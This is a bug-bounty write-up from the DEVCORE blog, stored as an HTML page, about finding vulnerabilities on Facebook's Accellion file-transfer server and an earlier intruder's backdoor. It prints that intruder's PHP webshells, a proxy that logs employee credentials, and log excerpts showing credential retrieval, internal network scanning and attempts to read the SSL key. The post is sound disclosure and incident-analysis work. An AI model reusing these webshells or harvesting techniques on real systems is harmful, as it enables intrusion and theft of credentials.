@@ -1,0 +1,1093 @@
+
+<!DOCTYPE html>
+<html class="no-js " lang="zh-TW" xmlns="http://www.w3.org/1999/xhtml" xmlns:og="http://ogp.me/ns#" xmlns:fb="http://www.facebook.com/2008/fbml">
+  <head>
+    <title>
+      How I Hacked Facebook, and Found Someone's Backdoor Script | DEVCORE 戴夫寇爾
+    </title>
+    <meta charset="utf-8">
+    <meta content="width=device-width, initial-scale=1, maximum-scale=1" name="viewport">
+    <meta name="description" property="og:description" content="Bug Bounty Hunting from Pentest View, and How to Find Remote Code Execution and Someone's Backdoor on Facebook Server..." />
+    <meta name="keywords" content="Facebook, BugBounty, RCE, Backdoor, Reconnaissance, Pentest" />
+    <meta property="og:site_name" content="DEVCORE 戴夫寇爾" />
+    <meta property="og:title" content="How I Hacked Facebook, and Found Someone's Backdoor Script | DEVCORE 戴夫寇爾" />
+    <meta property="og:url" content="http://devco.re/blog/2016/04/21/how-I-hacked-facebook-and-found-someones-backdoor-script-eng-ver/" />
+    <meta property="og:type" content="website" />
+    <meta property="og:image" content="https://2.bp.blogspot.com/-8s6XWWiUGXU/Vxhye5uEG9I/AAAAAAAADks/XfF97zbxPTMbf1zV4nB6r3Gd75p9tEDgQCLcB/s1600/facebook.jpg" />
+    <meta name="twitter:card" content="summary">
+    <meta name="twitter:site" content="d3vc0r3">
+    <meta name="twitter:title" content="How I Hacked Facebook, and Found Someone's Backdoor Script | DEVCORE 戴夫寇爾">
+    <meta name="twitter:description" content="Bug Bounty Hunting from Pentest View, and How to Find Remote Code Execution and Someone's Backdoor on Facebook Server...">
+    <meta name="twitter:creator" content="d3vc0r3">
+    <meta name="twitter:image:src" content="https://2.bp.blogspot.com/-8s6XWWiUGXU/Vxhye5uEG9I/AAAAAAAADks/XfF97zbxPTMbf1zV4nB6r3Gd75p9tEDgQCLcB/s1600/facebook.jpg">
+    <meta name="twitter:domain" content="devco.re">
+    <meta name="google-site-verification" content="lMNi_XT6UmeGqeYI_vLHu5PDRi_uNVfnA2NdDGS4-lM" />
+    <meta name="msvalidate.01" content="119FDBB7730BE45B162515BBB1FF6B33" />
+    <meta name="alexaVerifyID" content="j-Es9N9SD7ckfA2EokOz9SZzhok" />
+    <meta name='yandex-verification' content='4561963cf1d18fe3' />
+
+    <link rel="canonical" href="http://devco.re/blog/2016/04/21/how-I-hacked-facebook-and-found-someones-backdoor-script-eng-ver/"/>
+    <link rel="alternate" type="application/rss+xml" title="DEVCORE 戴夫寇爾" href="http://devco.re/rss">
+    <link rel="publisher" href="https://plus.google.com/118439315679478709768/" />
+
+    <link href="/assets/themes/devcore/images/favicon.png" rel="icon" size="32x32">
+    <link href="/assets/themes/devcore/stylesheets/all.min.css" media="screen" rel="stylesheet" type="text/css" />
+    <!--[if lt IE 9]><link href="/stylesheets/ie8.css" media="screen" rel="stylesheet" type="text/css" /><![endif]--><!--[if lt IE 9]><script src="//html5shim.googlecode.com/svn/trunk/html5.js" type="text/javascript"></script><![endif]-->
+  </head>
+  <body class="off-canvas" data-offset="48" data-spy="scroll" data-target=".quick-nav">
+    <div class="wrapper">
+      <div class="outside">
+        <div class="page-width">
+          <div class="close-menu-btn-wrapper">
+            <div class="close-menu-btn-wrapper-inner">
+              <a class="close-menu-btn" href="#close-menu">×</a>
+            </div>
+          </div>
+        </div>
+        <div class="outside-inner">
+          <div class="main-nav" data-set="main-nav">
+            <ul>
+              <li>
+                <a href="/services/penetration-test" title="滲透測試服務 Penetration Test">
+                  <div class="zh">
+                    服務
+                  </div>
+                  <div class="en">
+                    Services
+                  </div>
+                </a>
+                <ul>
+                  <li>
+                    <a href="/services/penetration-test" title="滲透測試服務 Penetration Test">
+                      <div class="zh">
+                        滲透測試服務
+                      </div>
+                      <div class="en">
+                        Penetration Test
+                      </div>
+                    </a>
+                  </li>
+                  <li>
+                    <a href="/services/security-training" title="資安教育訓練 Security Training">
+                      <div class="zh">
+                        資安教育訓練
+                      </div>
+                      <div class="en">
+                        Security Training
+                      </div>
+                    </a>
+                  </li>
+                  <li>
+                    <a href="/services/incident-response" title="資安事件處理 Incident Response">
+                      <div class="zh">
+                        資安事件處理
+                      </div>
+                      <div class="en">
+                        Incident Response
+                      </div>
+                    </a>
+                  </li>
+                  <li>
+                    <a href="/services/security-consulting" title="資安顧問服務 Security Consulting">
+                      <div class="zh">
+                        資安顧問服務
+                      </div>
+                      <div class="en">
+                        Security Consulting
+                      </div>
+                    </a>
+                  </li>
+                  <li>
+                    <a href="/services/security-seal" title="網站安全標章 Security Seal">
+                      <div class="zh">
+                        網站安全標章
+                      </div>
+                      <div class="en">
+                        Security Seal
+                      </div>
+                    </a>
+                  </li>
+                </ul>
+              </li>
+              <li>
+                <a href="/blog/" title="部落格 Blog">
+                  <div class="zh">
+                    部落格
+                  </div>
+                  <div class="en">
+                    Blog
+                  </div>
+                </a>
+                <ul>
+                  <li>
+                    <a href="/blog/category/%E6%9C%80%E6%96%B0%E6%B6%88%E6%81%AF/" title="最新消息 News">
+                      <div class="zh">
+                        最新消息
+                      </div>
+                      <div class="en">
+                        News
+                      </div>
+                    </a>
+                  </li>
+                  <li>
+                    <a href="/blog/category/%E6%A1%88%E4%BE%8B%E5%89%96%E6%9E%90/" title="案例剖析 Case Study">
+                      <div class="zh">
+                        案例剖析
+                      </div>
+                      <div class="en">
+                        Case Study
+                      </div>
+                    </a>
+                  </li>
+                  <li>
+                    <a href="/blog/category/%E6%8A%80%E8%A1%93%E5%B0%88%E6%AC%84/" title="技術專欄 Technical">
+                      <div class="zh">
+                        技術專欄
+                      </div>
+                      <div class="en">
+                        Technical
+                      </div>
+                    </a>
+                  </li>
+                  <li>
+                    <a href="/blog/category/%E7%A7%91%E6%99%AE%E6%96%87%E7%AB%A0/" title="科普文章 For Muggle">
+                      <div class="zh">
+                        科普文章
+                      </div>
+                      <div class="en">
+                        For Muggle
+                      </div>
+                    </a>
+                  </li>
+                </ul>
+              </li>
+              <li>
+                <a href="/about/" title="關於 About">
+                  <div class="zh">
+                    關於
+                  </div>
+                  <div class="en">
+                    About
+                  </div>
+                </a>
+              </li>
+              <li>
+                <a href="/contact/" title="聯絡 Contact">
+                  <div class="zh">
+                    聯絡
+                  </div>
+                  <div class="en">
+                    Contact
+                  </div>
+                </a>
+              </li>
+              <li>
+                <a href="/partners/" title="合作夥伴 Partners">
+                  <div class="zh">
+                    合作夥伴
+                  </div>
+                  <div class="en">
+                    Partners
+                  </div>
+                </a>
+              </li>
+            </ul>
+          </div>
+        </div>
+      </div>
+      <div class="page">
+        <div class="header">
+          <div class="header-inner">
+            <div class="main-nav" data-set="main-nav">
+              <ul>
+                <li>
+                  <a href="/services/penetration-test" title="滲透測試服務 Penetration Test">Services</a>
+                </li>
+                <li>
+                  <a href="/blog/" title="部落格 Blog">Blog</a>
+                </li>
+                <li>
+                  <a href="/about/" title="關於 About">About</a>
+                </li>
+                <li>
+                  <a href="/contact/" title="聯絡 Contact">Contact</a>
+                </li>
+                <li>
+                  <a href="/partners/" title="合作夥伴 Partners">Partners</a>
+                </li>
+                <li class="menu-button">
+                  <a class="open-menu-btn" href="#open-menu">・・・</a>
+                </li>
+              </ul>
+            </div>
+            <h1 class="logo">
+              <a href="/" title="DEVCORE 戴夫寇爾">How I Hacked Facebook, and Found Someone's Backdoor Script</a>
+            </h1>
+          </div>
+        </div>
+        <div class="main">
+          
+
+          <div class="page-header">
+            <div class="container">
+              <h2 class="page-header-title">
+                部落格 <small> Blog </small>
+              </h2>
+            </div>
+          </div>
+          <div class="page-content">
+            <div class="container">
+              <div class="post">
+                <div class="post-main">
+                  <div class="post-switch">
+                    <a class="prev" href="/blog/2016/04/21/how-I-hacked-facebook-and-found-someones-backdoor-script/" title="滲透 Facebook 的思路與發現">上一篇文章</a>
+                    
+                  </div>
+                  <div itemscope itemtype="http://schema.org/Article" class="post-content">
+                    <h2 itemprop="name" class="post-title">
+                      How I Hacked Facebook, and Found Someone's Backdoor Script
+                    </h2>
+                    <div class="post-info">
+                      
+                      
+                      
+<span class="post-category"><a href="/blog/category/案例剖析/" title="案例剖析">案例剖析</a></span><span class="posted">Posted </span>by <a class="poster" href="/blog/author/orange"><span itemprop="author" itemscope itemtype="http://schema.org/Person"><span itemprop="name">Orange Tsai</span></span></a>on <span class="post-time" itemprop="datePublished" content="2016-04-21">2016-04-21</span>
+
+
+                    </div>
+                    <div class="post-tag">
+                      
+                      Tags: <a href="/blog/tag/Facebook/">Facebook</a>, <a href="/blog/tag/BugBounty/">BugBounty</a>, <a href="/blog/tag/RCE/">RCE</a>, <a href="/blog/tag/Backdoor/">Backdoor</a>, <a href="/blog/tag/Reconnaissance/">Reconnaissance</a>, <a href="/blog/tag/Pentest/">Pentest</a>
+                    </div>
+                    <span itemprop="articleBody">
+                      
+<p>by <a href="http://blog.orange.tw/">Orange Tsai</a></p>
+
+<p><a href="http://devco.re/blog/2016/04/21/how-I-hacked-facebook-and-found-someones-backdoor-script-eng-ver/">How I Hacked Facebook, and Found Someone’s Backdoor Script</a> (English Version)<br />
+<a href="http://devco.re/blog/2016/04/21/how-I-hacked-facebook-and-found-someones-backdoor-script/">滲透 Facebook 的思路與發現</a> (中文版本)</p>
+
+<hr />
+
+<p><img src="https://2.bp.blogspot.com/-8s6XWWiUGXU/Vxhye5uEG9I/AAAAAAAADks/XfF97zbxPTMbf1zV4nB6r3Gd75p9tEDgQCLcB/s1600/facebook.jpg" alt="Facebook" /></p>
+
+<hr />
+
+<h3 id="foreword">Foreword</h3>
+
+<p>As a pentester, I love server-side vulnerabilities more than client-side ones. Why? Because it’s way much cooler to take over the server directly and gain system SHELL privileges. &lt;(￣︶￣)&gt;</p>
+
+<p>Of course, both vulnerabilities from the server-side and the client-side are indispensable in a perfect penetration test. Sometimes, in order to take over the server more elegantly, it also need some client-side vulnerabilities to do the trick. But speaking of finding vulnerabilities, I prefer to find server-side vulnerabilities first.</p>
+
+<p>With the growing popularity of Facebook around the world, I’ve always been interested in testing the security of Facebook. Luckily, in 2012, Facebook launched the <a href="https://www.facebook.com/whitehat/">Bug Bounty Program</a>, which even motivated me to give it a shot.</p>
+
+<!-- more -->
+
+<p>From a pentester’s view, I tend to start from recon and do some research. First, I’ll determine how large is the “territory” of the company on the internet, then…try to find a nice entrance to get in, for example:</p>
+
+<ul>
+  <li>What can I find by Google Hacking?</li>
+  <li>How many B Class IP addresses are used? How many C Class IPs?</li>
+  <li>Whois? Reverse Whois?</li>
+  <li>What domain names are used? What are their internal domain names? Then proceed with enumerating sub-domains</li>
+  <li>What are their preferred techniques and equipment vendors?</li>
+  <li>Any data breach on Github or Pastebin?</li>
+  <li>…etc</li>
+</ul>
+
+<p>Of course, Bug Bounty is nothing about firing random attacks without restrictions. By comparing your findings with the permitted actions set forth by Bug Bounty, the overlapping part will be the part worth trying.</p>
+
+<p>Here I’d like to explain some common security problems found in large corporations during pentesting by giving an example.</p>
+
+<ol>
+  <li>For most enterprises, “<strong>Network Boundary</strong>” is a rather difficult part to take care of. When the scale of a company has grown large, there are tens of thousands of routers, servers, computers for the MIS to handle, it’s impossible to build up a perfect mechanism of protection. Security attacks can only be defended with general rules, but a successful attack only needs a tiny weak spot. That’s why luck is often on the attacker’s side: a vulnerable server on the “border” is enough to grant a ticket to the internal network!</li>
+  <li>Lack of awareness in “<strong>Networking Equipment</strong>” protection. Most networking equipment doesn’t offer delicate SHELL controls and can only be configured on the user interface. Oftentimes the protection of these devices is built on the Network Layer. However, users might not even notice if these devices were compromised by 0-Day or 1-Day attacks.</li>
+  <li>Security of people: now we have witnessed the emergence of the “<strong>Breached Database</strong>” (aka “<strong>Social Engineering Database</strong>” in China), these leaked data sometimes makes the penetration difficulty incredibly low. Just connect to the breach database, find a user credential with VPN access…then voilà! You can proceed with penetrating the internal network. This is especially true when the scope of the data breach is so huge that the Key Man’s password can be found in the breached data. If this happens, then the security of the victim company will become nothing. :P<br />
+<br /></li>
+</ol>
+
+<p>For sure, when looking for the vulnerabilities on Facebook, I followed the thinking of the penetration tests which I was used to. When I was doing some recon and research, not only did I look up the domain names of Facebook itself, but also tried Reverse Whois. And to my surprise, I found an INTERESTING domain name:</p>
+
+<pre><code>tfbnw.net
+</code></pre>
+
+<p>TFBNW seemed to stand for “<strong>TheFacebook Network</strong>”  
+Then I found bellow server through public data</p>
+
+<pre><code>vpn.tfbnw.net
+</code></pre>
+
+<p>WOW. When I accessed vpn.tfbnw.net there’s the Juniper SSL VPN login interface. But its version seemed to be quite new and there was no vulnerability can be directly exploited…nevertheless, it brought up the beginning of the following story.</p>
+
+<p>It looked like TFBNW was an internal domain name for Facebook. Let’s try to enumerate the C Class IPs of vpn.tfbnw.net and found some interesting servers, for example:</p>
+
+<ul>
+  <li>Mail Server Outlook Web App</li>
+  <li>F5 BIGIP SSL VPN</li>
+  <li>CISCO ASA SSL VPN</li>
+  <li>Oracle E-Business</li>
+  <li>MobileIron MDM</li>
+</ul>
+
+<p>From the info of these servers, I thought that these C Class IPs were relatively important for Facebook. Now, the whole story officially starts here.</p>
+
+<hr />
+
+<h3 id="vulnerability-discovery">Vulnerability Discovery</h3>
+
+<p>I found a special server among these C Class IPs.</p>
+
+<pre><code>files.fb.com
+</code></pre>
+
+<p><img src="https://lh5.googleusercontent.com/-QTb-UeZgA4c/VsNtZZFa92I/AAAAAAAAA0k/zl9ckrR2aIc/w1358-h732-no/1.jpg" alt="files.fb.com" />
+<em>↑ Login Interface of files.fb.com</em></p>
+
+<p><br />
+Judging from the LOGO and Footer, this seems to be Accellion’s Secure File Transfer (hereafter known as FTA)</p>
+
+<p>FTA is a product which enables secure file transfer, online file sharing and syncing, as well as integration with Single Sign-on mechanisms including AD, LDAP and Kerberos. The Enterprise version even supports SSL VPN service.</p>
+
+<p>Upon seeing this, the first thing I did was searching for publicized exploits on the internet. The latest one was found by HD Moore and made public on this Rapid7’s Advisory</p>
+
+<ul>
+  <li><a href="https://community.rapid7.com/community/metasploit/blog/2015/07/10/r7-2015-08-accellion-file-transfer-appliance-vulnerabilities-cve-2015-2856-cve-2015-2857">Accellion File Transfer Appliance Vulnerabilities (CVE-2015-2856, CVE-2015-2857)</a></li>
+</ul>
+
+<p>Whether this vulnerability is exploitable can be determined by the version information leaked from “<strong>/tws/getStatus</strong>”. At the time I discovered files.fb.com the defective v0.18 has already been updated to v0.20. But from the fragments of source code mentioned in the Advisory, I felt that with such coding style there should still be security issues remained in FTA if I kept looking. Therefore, I began to look for 0-Day vulnerabilities on FTA products!</p>
+
+<p>Actually, from black-box testing, I didn’t find any possible vulnerabilities, and I had to try white-box testing. After gathering the source codes of previous versions FTA from several resources I could finally proceed with my research!</p>
+
+<p>The FTA Product</p>
+
+<ol>
+  <li>Web-based user interfaces were mainly composed of Perl &amp; PHP</li>
+  <li>The PHP source codes were encrypted by IonCube</li>
+  <li>Lots of Perl Daemons in the background</li>
+</ol>
+
+<p>First I tried to decrypt IonCube encryption. In order to avoid being reviewed by the hackers, a lot of network equipment vendors will encrypt their product source codes. Fortunately, the IonCube version used by FTA was not up to date and could be decrypted with ready-made tools. But I still  had to fix some details, or it’s gonna be messy…</p>
+
+<p>After a simple review, I thought Rapid7 should have already got the easier vulnerabilities. T^T<br />
+And the vulnerabilities which needed to be triggered were not easy to exploit. Therefore I need to look deeper!</p>
+
+<p>Finally, I found 7 vulnerabilities, including</p>
+
+<ul>
+  <li>Cross-Site Scripting x 3</li>
+  <li>Pre-Auth SQL Injection leads to Remote Code Execution</li>
+  <li>Known-Secret-Key leads to Remote Code Execution</li>
+  <li>Local Privilege Escalation x 2</li>
+</ul>
+
+<p>Apart from reporting to Facebook Security Team, other vulnerabilities were submitted to Accellion Support Team in Advisory for their reference. After vendor patched, I also sent these to CERT/CC and they assigned 4 CVEs for these vulnerabilities.</p>
+
+<ul>
+  <li>CVE-2016-2350</li>
+  <li>CVE-2016-2351</li>
+  <li>CVE-2016-2352</li>
+  <li>CVE-2016-2353</li>
+</ul>
+
+<p>More details will be published after full disclosure policy!</p>
+
+<p><img src="https://lh3.googleusercontent.com/-j0wWW746G9w/VsNtZRRFO0I/AAAAAAAAA0s/w2DWhzGEW9c/w739-h440-no/2.jpg" alt="shell on facebook" />
+<em>↑ Using Pre-Auth SQL Injection to Write Webshell</em></p>
+
+<p><br />
+After taking control of the server successfully, the first thing is to check whether the server environment is friendly to you. To stay on the server longer, you have to be familiar with the environments, restrictions, logs, etc and try hard not to be detected. :P</p>
+
+<p>There are some restrictions on the server:</p>
+
+<ol>
+  <li>Firewall outbound connection unavailable, including TCP, UDP, port 53, 80 and 443</li>
+  <li>Remote Syslog server</li>
+  <li>Auditd logs enabled</li>
+</ol>
+
+<p>Although the outbound connection was not available, but it looked like ICMP Tunnel was working. Nevertheless, this was only a Bug Bounty Program, we could simply control the server with a webshell.</p>
+
+<hr />
+
+<h3 id="was-there-something-strange">Was There Something Strange?</h3>
+
+<p>While collecting vulnerability details and evidences for reporting to Facebook, I found some strange things on web log.</p>
+
+<p>First of all I found some strange PHP error messages in “<strong>/var/opt/apache/php_error_log</strong>”  
+These error messages seemed to be caused by modifying codes online?</p>
+
+<p><img src="https://lh5.googleusercontent.com/-PG1ENyW2WOQ/VsNtZZhaROI/AAAAAAAAA0o/x6hGv4HyPng/w1358-h732-no/3.jpg" alt="PHP error log" />
+<em>↑ PHP error log</em></p>
+
+<p><br />
+I followed the PHP paths in error messages and ended up with discovering suspicious WEBSHELL files left by previous “visitors”.</p>
+
+<p><img src="https://lh4.googleusercontent.com/-2-8aZhSWGkk/VsNtZ0hOPpI/AAAAAAAAA0w/UBwhhct9Nmc/w728-h559-no/4.jpg" alt="Webshell on facebook server" />
+<em>↑ Webshell on facebook server</em></p>
+
+<p>some contents of the files are as follows:</p>
+
+<p><strong>sshpass</strong></p>
+<pre><code>Right, THAT <a href="http://linux.die.net/man/1/sshpass">sshpass</a></code></pre>
+<p><strong>bN3d10Aw.php</strong></p>
+
+<div class="highlight"><pre><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">shell_exec</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">]);</span> <span class="cp">?&gt;</span><span class="x"></span></code></pre></div>
+
+<p><strong>uploader.php</strong></p>
+
+<div class="highlight"><pre><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span> <span class="nb">move_uploaded_file</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s2">&quot;f][&quot;</span><span class="nx">tmp_name</span><span class="s2">&quot;], basename(</span><span class="si">$_FILES[&quot;f&quot;]</span><span class="s2">[&quot;</span><span class="nx">name</span><span class="s2">&quot;])); ?&gt;</span></code></pre></div>
+
+<p><strong>d.php</strong></p>
+
+<div class="highlight"><pre><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span> <span class="nx">include_oncce</span><span class="p">(</span><span class="s2">&quot;/home/seos/courier/remote.inc&quot;</span><span class="p">);</span> <span class="k">echo</span> <span class="nx">decrypt</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;c&quot;</span><span class="p">]);</span> <span class="cp">?&gt;</span><span class="x"></span></code></pre></div>
+
+<p><strong>sclient_user_class_standard.inc</strong></p>
+
+<div class="highlight"><pre><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span>
+<span class="k">include_once</span><span class="p">(</span><span class="s1">&#39;sclient_user_class_standard.inc.orig&#39;</span><span class="p">);</span>
+<span class="nv">$fp</span> <span class="o">=</span> <span class="nb">fopen</span><span class="p">(</span><span class="s2">&quot;/home/seos/courier/B3dKe9sQaa0L.log&quot;</span><span class="p">,</span> <span class="s2">&quot;a&quot;</span><span class="p">);</span> 
+<span class="nv">$retries</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+<span class="nv">$max_retries</span> <span class="o">=</span> <span class="mi">100</span><span class="p">;</span> 
+
+<span class="c1">// blah blah blah...</span>
+
+<span class="nb">fwrite</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span> <span class="nb">date</span><span class="p">(</span><span class="s2">&quot;Y-m-d H:i:s T&quot;</span><span class="p">)</span> <span class="o">.</span> <span class="s2">&quot;;&quot;</span> <span class="o">.</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">&quot;REMOTE_ADDR&quot;</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&quot;;&quot;</span> <span class="o">.</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">&quot;HTTP_USER_AGENT&quot;</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&quot;;POST=&quot;</span> <span class="o">.</span> <span class="nb">http_build_query</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">)</span> <span class="o">.</span> <span class="s2">&quot;;GET=&quot;</span> <span class="o">.</span> <span class="nb">http_build_query</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">)</span> <span class="o">.</span> <span class="s2">&quot;;COOKIE=&quot;</span> <span class="o">.</span> <span class="nb">http_build_query</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">)</span> <span class="o">.</span> <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">);</span> 
+
+<span class="c1">// blah blah blah...</span></code></pre></div>
+
+<p>The first few ones were typical PHP one-line backdoor and there’s one exception: “<strong>sclient_user_class_standard.inc</strong>”</p>
+
+<p>In include_once “<strong>sclient_user_class_standard.inc.orig</strong>” was the original PHP app for password verification, and the hacker created a proxy in between to log GET, POST, COOKIE values while some important operations were under way.</p>
+
+<p>A brief summary, the hacker created a proxy on the credential page to log the credentials of Facebook employees. These logged passwords were stored under web directory for the hacker to use WGET every once in a while</p>
+
+<pre><code>wget https://files.fb.com/courier/B3dKe9sQaa0L.log
+</code></pre>
+
+<p><img src="https://lh3.googleusercontent.com/-Z3OiEcB8VTg/VsNtaA_lgBI/AAAAAAAAA00/BiZzrwkXjR8/w649-h88-no/5.jpg" alt="logged password" />
+<em>↑ Logged passwords</em></p>
+
+<p><br /></p>
+
+<p>From this info we can see that apart from the logged credentials there were also contents of letters requesting files from FTA, and these logged credentials were rotated regularly (this will be mentioned later, that’s kinda cheap…XD)</p>
+
+<p>And at the time I discovered these, there were around 300 logged credentials dated between February 1st to 7th, from February 1st, mostly “<strong>@fb.com</strong>” and “<strong>@facebook.com</strong>”. Upon seeing it I thought it’s a pretty serious security incident. In FTA, there were mainly two modes for user login</p>
+
+<ol>
+  <li>Regular users sign up: their password hash were stored in the database and hashed encrypted with SHA256+SALT</li>
+  <li>All Facebook employees (@fb.com) used LDAP and authenticated by AD Server</li>
+</ol>
+
+<p>I believe these logged credentials were real passwords and I <strong>**GUESS</strong>** they can access to services such as Mail OWA, VPN for advanced penetration…</p>
+
+<p>In addition, this hacker might be careless:P</p>
+
+<ol>
+  <li>The backdoor parameters were passed through GET method and his footprinting can be identified easily in from web log</li>
+  <li>When the hacker was sending out commands, he didn’t take care of STDERR, and left a lot of command error messages in web log which the hacker’s operations could be seen</li>
+</ol>
+
+<p><br />
+From access.log, every few days the hacker will clear all the credentials he logged</p>
+
+<div class="highlight"><pre><code class="language-prolog" data-lang="prolog"><span class="mf">192.168.54.13</span> <span class="o">-</span> <span class="o">-</span> <span class="mi">17955</span> <span class="p">[</span><span class="nv">Sat</span><span class="p">,</span> <span class="mi">23</span> <span class="nv">Jan</span> <span class="mi">2016</span> <span class="mi">19</span><span class="s-Atom">:</span><span class="mi">04</span><span class="s-Atom">:</span><span class="mi">10</span> <span class="o">+</span><span class="mi">0000</span> <span class="p">|</span> <span class="mi">1453575850</span><span class="p">]</span> <span class="s2">&quot;GET /courier/custom_template/1000/bN3dl0Aw.php?c=./sshpass -p &#39;12069238df&#39; ssh -v -o StrictHostKeyChecking=no soggycat@localhost &#39;cp /home/seos/courier/B3dKe9sQaa0L.log /home/seos/courier/B3dKe9sQaa0L.log.2; echo &gt; /home/seos/courier/B3dKe9sQaa0L.log&#39; 2&gt;/dev/stdout HTTP/1.1&quot;</span> <span class="mi">200</span> <span class="mi">2559</span> <span class="p">...</span></code></pre></div>
+
+<p><br /></p>
+
+<p>Packing files</p>
+
+<div class="highlight"><pre><code class="language-bash" data-lang="bash">cat tmp_list3_2 <span class="p">|</span> <span class="k">while</span> <span class="nb">read </span>line<span class="p">;</span> <span class="k">do</span> cp /home/filex2/1000/<span class="nv">$line</span> files<span class="p">;</span> <span class="k">done</span> 2&gt;/dev/stdout
+tar -czvf files.tar.gz files</code></pre></div>
+
+<p><br /></p>
+
+<p>Enumerating internal network architecture</p>
+
+<div class="highlight"><pre><code class="language-tex" data-lang="tex">dig a archibus.thefacebook.com
+telnet archibus.facebook.com 80
+curl http://archibus.thefacebook.com/spaceview<span class="nb">_</span>facebook/locator/room.php
+dig a records.fb.com
+telnet records.fb.com 80
+telnet records.fb.com 443
+wget -O- -q http://192.168.41.16
+dig a acme.facebook.com
+./sshpass -p &#39;********&#39; ssh -v -o StrictHostKeyChecking=no soggycat@localhost &#39;for i in <span class="s">$</span><span class="o">(</span><span class="nb">seq </span><span class="m">201</span><span class="nb"> </span><span class="m">1</span><span class="nb"> </span><span class="m">255</span><span class="o">)</span><span class="nb">; do for j in </span><span class="s">$</span>(seq 0 1 255); do echo &quot;192.168.<span class="s">$</span><span class="nb">i.</span><span class="s">$</span>j:`dig +short ptr <span class="s">$</span><span class="nb">j.</span><span class="s">$</span>i.168.192.in-addr.arpa`&quot;; done; done&#39; 2&gt;/dev/stdout
+...</code></pre></div>
+
+<p><br /></p>
+
+<p>Use ShellScript to scan internal network but forgot to redirect STDERR XD
+<img src="https://lh5.googleusercontent.com/-kWigHQIuudM/VsNtaFXXiyI/AAAAAAAAA04/OoXNt7VeTcY/w1358-h732-no/6.jpg" alt="Port Scanning" />
+<br /></p>
+
+<p>Attempt to connect internal LDAP server</p>
+
+<div class="highlight"><pre><code class="language-tex" data-lang="tex">sh: -c: line 0: syntax error near unexpected token `(&#39;
+sh: -c: line 0: `ldapsearch -v -x -H ldaps://ldap.thefacebook.com -b CN=svc-accellion,OU=Service Accounts,DC=thefacebook,DC=com -w &#39;********&#39; -s base (objectclass=*) 2&gt;/dev/stdout&#39;</code></pre></div>
+
+<p><br /></p>
+
+<p>Attempt to access internal server <br />
+(Looked like Mail OWA could be accessed directly…)</p>
+
+<div class="highlight"><pre><code class="language-text" data-lang="text">--20:38:09--  https://mail.thefacebook.com/
+Resolving mail.thefacebook.com... 192.168.52.37
+Connecting to mail.thefacebook.com|192.168.52.37|:443... connected.
+HTTP request sent, awaiting response... 302 Found
+Location: https://mail.thefacebook.com/owa/ [following]
+--20:38:10--  https://mail.thefacebook.com/owa/
+Reusing existing connection to mail.thefacebook.com:443.
+HTTP request sent, awaiting response... 302 Moved Temporarily
+Location: https://mail.thefacebook.com/owa/auth/logon.aspx?url=https://mail.thefacebook.com/owa/&amp;reason=0 [following]
+--20:38:10--  https://mail.thefacebook.com/owa/auth/logon.aspx?url=https://mail.thefacebook.com/owa/&amp;reason=0
+Reusing existing connection to mail.thefacebook.com:443.
+HTTP request sent, awaiting response... 200 OK
+Length: 8902 (8.7K) [text/html]
+Saving to: `STDOUT&#39;
+
+     0K ........                                              100% 1.17G=0s
+
+20:38:10 (1.17 GB/s) - `-&#39; saved [8902/8902]
+
+--20:38:33--  (try:15)  https://10.8.151.47/
+Connecting to 10.8.151.47:443... --20:38:51--  https://svn.thefacebook.com/
+Resolving svn.thefacebook.com... failed: Name or service not known.
+--20:39:03--  https://sb-dev.thefacebook.com/
+Resolving sb-dev.thefacebook.com... failed: Name or service not known.
+failed: Connection timed out.
+Retrying.</code></pre></div>
+
+<p><br /></p>
+
+<p>Attempt to steal SSL Private Key</p>
+
+<div class="highlight"><pre><code class="language-text" data-lang="text">sh: /etc/opt/apache/ssl.crt/server.crt: Permission denied
+ls: /etc/opt/apache/ssl.key/server.key: No such file or directory
+mv: cannot stat `x&#39;: No such file or directory
+sh: /etc/opt/apache/ssl.crt/server.crt: Permission denied
+mv: cannot stat `x&#39;: No such file or directory
+sh: /etc/opt/apache/ssl.crt/server.crt: Permission denied
+mv: cannot stat `x&#39;: No such file or directory
+sh: /etc/opt/apache/ssl.crt/server.crt: Permission denied
+mv: cannot stat `x&#39;: No such file or directory
+sh: /etc/opt/apache/ssl.crt/server.crt: Permission denied
+mv: cannot stat `x&#39;: No such file or directory
+sh: /etc/opt/apache/ssl.crt/server.crt: Permission denied
+base64: invalid input</code></pre></div>
+
+<p><br /></p>
+
+<p>After checking the browser, the SSL certificate of files.fb.com was *.fb.com …</p>
+
+<p><img src="https://lh4.googleusercontent.com/-tMk1LItZLMc/VsNtadzSINI/AAAAAAAAA08/RO9jDem_Iiw/w564-h511-no/7.jpg" alt="certificate of files.fb.com" /></p>
+
+<hr />
+
+<h3 id="epilogue">Epilogue</h3>
+
+<p>After adequate proofs had been collected, they were immediately reported to Facebook Security Team. Other than vulnerability details accompanying logs, screenshots and timelines were also submitted xD</p>
+
+<p>Also, from the log on the server, there were two periods that the system was obviously operated by the hacker, one in the beginning of July and one in mid-September</p>
+
+<p>the July one seemed to be a server “dorking” and the September one seemed more vicious. Other than server “dorking” keyloggers were also implemented. As for the identities of these two hackers, were they the same person? Your guess is as good as mine. :P<br />
+The time July incident happened to take place right before the announcement of CVE-2015-2857 exploit. Whether it was an invasion of 1-day exploitation or unknown 0-day ones were left in question.</p>
+
+<p><br /></p>
+
+<p>Here’s the end of the story, and, generally speaking, it was a rather interesting experience xD<br />
+Thanks to this event, it inspired me to write some articles about penetration :P</p>
+
+<p>Last but not least, I would like to thank Bug Bounty and tolerant Facebook Security Team so that I could fully write down this incident : )</p>
+
+<p><br /></p>
+
